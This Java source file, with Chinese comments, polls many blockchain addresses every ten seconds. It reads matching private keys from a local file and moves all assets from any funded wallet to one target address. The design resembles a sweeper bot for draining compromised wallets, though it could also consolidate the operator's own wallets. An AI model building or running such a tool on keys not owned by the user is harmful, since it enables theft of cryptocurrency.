package com.monitor;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.*;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class MultiChainWalletMonitor {
    private static final Logger logger = LoggerFactory.getLogger(MultiChainWalletMonitor.class);
    
    // 配置文件路径
    private static final String MONITORED_ADDRESSES_FILE = "monitored_addresses.txt";
    private static final String PROCESSED_WALLETS_FILE = "processed_wallets.txt";
    
    // 配置信息
    private final String targetAddress;
    private final String alchemyApiKey;
    private final boolean isRestart;
    
    private final Set<String> monitoredAddresses = new HashSet<>();
    private final Set<String> processedWallets = new HashSet<>();
    private final Map<String, ChainConfig> supportedChains = new HashMap<>();
    
    private ScheduledExecutorService scheduler;

    public MultiChainWalletMonitor(String targetAddress, String alchemyApiKey, boolean isRestart) {
        this.targetAddress = targetAddress;
        this.alchemyApiKey = alchemyApiKey;
        this.isRestart = isRestart;
    }

    public static void main(String[] args) {
        logger.info("=== 多链钱包监控系统启动 ===");
        
        try {
            // 显示配置菜单
            ConfigurationMenu configMenu = new ConfigurationMenu();
            configMenu.showMainMenu();
            
        } catch (Exception e) {
            logger.error("程序启动失败: {}", e.getMessage(), e);
            System.exit(1);
        }
    }

    /**
     * 启动监控系统
     */
    public void startMonitoring() {
        try {
            logger.info("=== 多链钱包监控系统启动 ===");
            logger.info("目标地址: {}", targetAddress);
            logger.info("运行模式: {}", isRestart ? "重新开始" : "继续上次");
            
            // 初始化支持的链配置
            initializeSupportedChains();
            
            // 加载监控地址
            loadMonitoredAddresses();
            
            // 处理重启逻辑
            handleRestartLogic();
            
            // 启动监控
            startMonitoringProcess();
            
        } catch (Exception e) {
            logger.error("启动监控失败: {}", e.getMessage(), e);
            throw new RuntimeException("启动监控失败", e);
        }
    }

    /**
     * 初始化支持的链配置
     */
    private void initializeSupportedChains() {
        supportedChains.putAll(ChainConfig.getSupportedChains(alchemyApiKey));
        logger.info("已加载 {} 个支持的区块链网络", supportedChains.size());
        
        // 打印所有支持的链
        logger.info("支持的区块链网络:");
        supportedChains.values().forEach(chain -> {
            if (chain.isEVM()) {
                logger.info("  - {} (Chain ID: {}, EVM)", chain.getName(), chain.getChainId());
            } else {
                logger.info("  - {} (非EVM链)", chain.getName());
            }
        });
    }

    /**
     * 加载监控地址
     */
    private void loadMonitoredAddresses() {
        try {
            if (Files.exists(Paths.get(MONITORED_ADDRESSES_FILE))) {
                List<String> addresses = Files.readAllLines(Paths.get(MONITORED_ADDRESSES_FILE));
                monitoredAddresses.addAll(addresses);
                logger.info("加载了 {} 个监控地址", monitoredAddresses.size());
            } else {
                throw new RuntimeException("监控地址文件不存在: " + MONITORED_ADDRESSES_FILE);
            }
        } catch (IOException e) {
            throw new RuntimeException("加载监控地址失败: " + e.getMessage(), e);
        }
    }

    /**
     * 处理重启逻辑
     */
    private void handleRestartLogic() {
        if (isRestart) {
            // 重新开始 - 清空已处理记录
            try {
                Files.deleteIfExists(Paths.get(PROCESSED_WALLETS_FILE));
                logger.info("重新开始监控，已清空历史记录");
            } catch (IOException e) {
                logger.warn("清空历史记录失败: {}", e.getMessage());
            }
        } else {
            // 继续上次 - 加载已处理记录
            loadProcessedWallets();
            logger.info("继续上次的监控，已加载 {} 个已处理的钱包", processedWallets.size());
        }
    }

    /**
     * 加载已处理的钱包
     */
    private void loadProcessedWallets() {
        try {
            if (Files.exists(Paths.get(PROCESSED_WALLETS_FILE))) {
                List<String> lines = Files.readAllLines(Paths.get(PROCESSED_WALLETS_FILE));
                processedWallets.addAll(lines);
            }
        } catch (IOException e) {
            logger.warn("读取已处理钱包文件失败: {}", e.getMessage());
        }
    }

    /**
     * 启动监控过程
     */
    private void startMonitoringProcess() {
        logger.info("=== 开始监控 {} 个钱包 ===", monitoredAddresses.size());
        
        scheduler = Executors.newScheduledThreadPool(Math.min(supportedChains.size(), 10));
        
        // 首次运行时检查交易历史
        if (isRestart) {
            logger.info("首次运行：检查所有钱包的交易历史...");
            performInitialCheck();
        }
        
        // 启动定期监控 - 每条链一个线程
        for (ChainConfig chain : supportedChains.values()) {
            scheduler.scheduleAtFixedRate(() -> monitorChain(chain), 0, 10, TimeUnit.SECONDS);
        }
        
        // 添加关闭钩子
        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            logger.info("程序正在关闭...");
            if (scheduler != null) {
                scheduler.shutdown();
                try {
                    if (!scheduler.awaitTermination(5, TimeUnit.SECONDS)) {
                        scheduler.shutdownNow();
                    }
                } catch (InterruptedException e) {
                    scheduler.shutdownNow();
                    Thread.currentThread().interrupt();
                }
            }
        }));
        
        logger.info("监控系统已启动，按 Ctrl+C 停止监控");
        logger.info("监控间隔: 10秒");
        logger.info("支持代币类型: ERC20");
        
        // 保持程序运行
        try {
            Thread.currentThread().join();
        } catch (InterruptedException e) {
            logger.info("监控系统被中断");
            Thread.currentThread().interrupt();
        }
    }

    /**
     * 首次运行时的初始检查
     */
    private void performInitialCheck() {
        logger.info("开始初始化检查，检测哪些链上有交易历史...");
        
        Map<String, Boolean> chainActivity = new HashMap<>();
        
        for (ChainConfig chain : supportedChains.values()) {
            logger.info("检查链: {}", chain.getName());
            
            boolean hasAnyTransaction = false;
            int checkedCount = 0;
            int maxCheck = Math.min(50, monitoredAddresses.size()); // 最多检查50个地址
            
            for (String address : monitoredAddresses) {
                if (checkedCount >= maxCheck) break;
                
                try {
                    if (WalletMonitor.hasTransactionHistory(address, chain)) {
                        hasAnyTransaction = true;
                        break;
                    }
                    checkedCount++;
                } catch (Exception e) {
                    logger.debug("检查交易历史失败 - 链: {}, 地址: {}", chain.getName(), address);
                }
            }
            
            chainActivity.put(chain.getName(), hasAnyTransaction);
            
            if (hasAnyTransaction) {
                logger.info("链 {} 上发现交易历史，将进行监控", chain.getName());
            } else {
                logger.info("链 {} 上没有发现交易历史，仍会进行监控", chain.getName());
            }
        }
        
        // 保存链活动状态
        saveChainActivity(chainActivity);
    }

    /**
     * 保存链活动状态
     */
    private void saveChainActivity(Map<String, Boolean> chainActivity) {
        try {
            List<String> lines = new ArrayList<>();
            for (Map.Entry<String, Boolean> entry : chainActivity.entrySet()) {
                lines.add(entry.getKey() + "=" + entry.getValue());
            }
            Files.write(Paths.get("chain_activity.txt"), lines, 
                StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.TRUNCATE_EXISTING);
        } catch (IOException e) {
            logger.warn("保存链活动状态失败: {}", e.getMessage());
        }
    }

    /**
     * 监控指定链
     */
    private void monitorChain(ChainConfig chain) {
        try {
            logger.debug("监控链: {} (地址数量: {})", chain.getName(), monitoredAddresses.size());
            
            int foundCount = 0;
            int processedCount = 0;
            
            for (String address : monitoredAddresses) {
                // 跳过已经处理过的钱包
                String walletChainKey = address + "_" + chain.getName();
                if (processedWallets.contains(walletChainKey)) {
                    continue;
                }
                
                try {
                    // 检查是否有余额
                    if (WalletMonitor.hasAnyBalance(address, chain)) {
                        foundCount++;
                        logger.info("*** 发现余额! *** 链: {}, 地址: {}", chain.getName(), address);
                        
                        // 查找对应的私钥并转账
                        String privateKey = findPrivateKeyForAddress(address);
                        if (privateKey != null) {
                            logger.info("开始转移资产 - 链: {}, 从: {}, 到: {}", 
                                chain.getName(), address, targetAddress);
                            
                            // 执行转账
                            TransactionSender.transferAllAssets(privateKey, targetAddress, chain);
                            
                            // 标记为已处理
                            processedWallets.add(walletChainKey);
                            saveProcessedWallet(walletChainKey);
                            processedCount++;
                            
                        } else {
                            logger.error("找不到地址 {} 对应的私钥", address);
                        }
                    }
                    
                } catch (Exception e) {
                    logger.debug("检查地址余额失败 - 链: {}, 地址: {}, 错误: {}", 
                        chain.getName(), address, e.getMessage());
                }
            }
            
            if (foundCount > 0) {
                logger.info("链 {} 本轮发现 {} 个有余额的地址，处理了 {} 个", 
                    chain.getName(), foundCount, processedCount);
            }
            
        } catch (Exception e) {
            logger.error("监控链 {} 时发生错误: {}", chain.getName(), e.getMessage());
        }
    }

    /**
     * 查找地址对应的私钥
     */
    private String findPrivateKeyForAddress(String address) {
        try {
            if (Files.exists(Paths.get("private_keys.txt"))) {
                List<String> privateKeys = Files.readAllLines(Paths.get("private_keys.txt"));
                
                for (String privateKey : privateKeys) {
                    privateKey = privateKey.trim();
                    if (!privateKey.isEmpty()) {
                        try {
                            org.web3j.crypto.Credentials credentials = org.web3j.crypto.Credentials.create(privateKey);
                            if (credentials.getAddress().equalsIgnoreCase(address)) {
                                return privateKey;
                            }
                        } catch (Exception e) {
                            logger.debug("验证私钥失败: {}", e.getMessage());
                        }
                    }
                }
            }
        } catch (IOException e) {
            logger.error("读取私钥文件失败: {}", e.getMessage());
        }
        return null;
    }

    /**
     * 保存已处理的钱包
     */
    private void saveProcessedWallet(String walletChainKey) {
        try {
            Files.write(Paths.get(PROCESSED_WALLETS_FILE), 
                Collections.singletonList(walletChainKey), 
                StandardOpenOption.CREATE, StandardOpenOption.WRITE, StandardOpenOption.APPEND);
        } catch (IOException e) {
            logger.warn("保存已处理钱包记录失败: {}", e.getMessage());
        }
    }

    /**
     * 获取监控统计信息
     */
    public Map<String, Object> getMonitoringStats() {
        Map<String, Object> stats = new HashMap<>();
        stats.put("totalAddresses", monitoredAddresses.size());
        stats.put("processedWallets", processedWallets.size());
        stats.put("supportedChains", supportedChains.size());
        stats.put("targetAddress", targetAddress);
        stats.put("isRunning", scheduler != null && !scheduler.isShutdown());
        return stats;
    }

    /**
     * 停止监控
     */
    public void stopMonitoring() {
        if (scheduler != null && !scheduler.isShutdown()) {
            scheduler.shutdown();
            try {
                if (!scheduler.awaitTermination(5, TimeUnit.SECONDS)) {
                    scheduler.shutdownNow();
                }
                logger.info("监控系统已停止");
            } catch (InterruptedException e) {
                scheduler.shutdownNow();
                Thread.currentThread().interrupt();
                logger.info("监控系统强制停止");
            }
        }
    }
} 
